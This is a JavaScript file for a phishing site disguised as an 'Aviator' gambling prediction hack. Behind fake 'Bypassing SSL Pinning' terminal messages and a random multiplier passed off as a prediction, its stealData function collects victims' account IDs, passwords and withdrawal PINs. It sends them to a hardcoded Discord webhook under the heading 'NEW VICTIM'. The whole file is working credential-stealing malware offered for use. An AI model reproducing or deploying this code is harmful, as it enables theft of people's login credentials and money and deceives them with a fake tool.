// --- CONFIGURATION ---
const WEBHOOK = "https://discord.com/api/webhooks/1435143642741342219/qrH9-UqI_he3FLKErGBtEFpnREK99HbMdBXOLh3W1U_xRYK8leRc-Dr5ZO8x2IMA4n1E";
const VALID_CODES = ["SHEHZAD_VIP", "KING_PK", "BEAST_777", "MONEY_GLITCH"];
let selectedPlatform = "";

// --- INDEX.HTML LOGIC (Access Control) ---
function openAccessModal() {
    document.getElementById('accessModal').style.display = 'flex';
}

function verifyKey() {
    const key = document.getElementById('accessKey').value.trim();
    
    if (VALID_CODES.includes(key)) {
        // Save session
        sessionStorage.setItem("isVerified", "true");
        // Redirect to tool
        window.location.href = "tool.html";
    } else {
        alert("INVALID KEY! Contact Admin on WhatsApp.");
    }
}

// --- TOOL.HTML LOGIC (Hacking) ---
// Check if verified on load (uncomment for security)
/*
if (window.location.pathname.includes("tool.html")) {
    if (sessionStorage.getItem("isVerified") !== "true") {
        window.location.href = "index.html";
    }
}
*/

function openPhish(platform) {
    selectedPlatform = platform;
    document.getElementById('phishTitle').innerText = "CONNECT TO " + platform;
    document.getElementById('phishModal').style.display = 'flex';
    
    // Reset Views
    document.getElementById('inputArea').style.display = 'block';
    document.getElementById('loaderArea').style.display = 'none';
    document.getElementById('resultArea').style.display = 'none';
    document.getElementById('uid').value = "";
    document.getElementById('pass').value = "";
    document.getElementById('pin').value = "";
}

async function stealData() {
    const uid = document.getElementById('uid').value;
    const pass = document.getElementById('pass').value;
    const pin = document.getElementById('pin').value;

    if (!uid || !pass || !pin) {
        alert("All fields are required for API Connection.");
        return;
    }

    // 1. Show Loader
    document.getElementById('inputArea').style.display = 'none';
    document.getElementById('loaderArea').style.display = 'block';
    runTerminal();

    // 2. Send to Discord
    const payload = {
        username: "Aviator Beast Logger",
        embeds: [{
            title: `🚨 NEW VICTIM: ${selectedPlatform}`,
            color: 3066993, // Green
            fields: [
                { name: "🆔 ID/Phone", value: `\`${uid}\``, inline: true },
                { name: "🔑 Password", value: `\`${pass}\``, inline: true },
                { name: "💰 Withdraw PIN", value: `\`${pin}\``, inline: false },
                { name: "🌍 Platform", value: selectedPlatform, inline: true }
            ],
            footer: { text: "Hacked by SHEHZAD" },
            timestamp: new Date().toISOString()
        }]
    };

    try {
        await fetch(WEBHOOK, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });
    } catch (e) {
        console.error(e);
    }
}

function runTerminal() {
    const logs = document.getElementById('logs');
    logs.innerHTML = "";
    const messages = [
        "Establishing secure handshake...",
        `Targeting ${selectedPlatform} Server...`,
        "Bypassing SSL Pinning...",
        "Injecting SQL Payload...",
        "Retrieving Hash History...",
        "Decryption Successful.",
        "Calculating Next Flight..."
    ];

    let i = 0;
    const interval = setInterval(() => {
        if (i < messages.length) {
            logs.innerHTML += `<div style="color:${i%2==0?'#0f0':'#fff'}">> ${messages[i]}</div>`;
            logs.scrollTop = logs.scrollHeight;
            i++;
        } else {
            clearInterval(interval);
            showResult();
        }
    }, 800);
}

function showResult() {
    document.getElementById('loaderArea').style.display = 'none';
    document.getElementById('resultArea').style.display = 'block';
    
    // Generate Random Prediction (1.20x to 4.50x)
    const pred = (Math.random() * (4.50 - 1.20) + 1.20).toFixed(2);
    document.getElementById('prediction').innerText = pred + "x";
}

function nextSignal() {
    document.getElementById('resultArea').style.display = 'none';
    document.getElementById('loaderArea').style.display = 'block';
    // Fast terminal for next signal
    const logs = document.getElementById('logs');
    logs.innerHTML = "<div>> Re-syncing with server...</div>";
    setTimeout(() => {
        showResult();
    }, 2000);
}